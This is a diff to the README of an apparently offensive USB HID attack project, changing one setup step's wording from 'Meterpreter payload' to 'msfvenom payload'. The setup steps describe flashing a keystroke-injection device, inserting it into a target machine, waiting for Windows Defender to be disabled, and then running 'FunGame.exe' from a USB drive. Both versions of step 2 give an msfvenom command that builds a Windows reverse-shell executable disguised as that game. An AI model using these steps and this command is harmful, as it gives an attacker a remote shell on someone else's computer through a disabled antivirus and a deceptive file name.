@@ -47,7 +47,7 @@ Use a HID device like [Hak5 Rubber Ducky](https://shop.hak5.org/products/usb-rub
 ## 🚀 Setup Instructions
 
 1. Flash the HID device with the provided payload using the official encoder.
-2. Prepare a USB drive labeled `MYUSB` with a file named `FunGame.exe` with a Meterpreter payload using --msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 -f exe > FunGame.exe--
+2. Prepare a USB drive labeled `MYUSB` with a file named `FunGame.exe` with a msfvenom payload using --msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 -f exe > FunGame.exe--
 3. Insert the HID device into the target machine.
 4. After Defender is disabled and the message appears, plug in the USB.
 5. `FunGame.exe` will be executed from the USB.
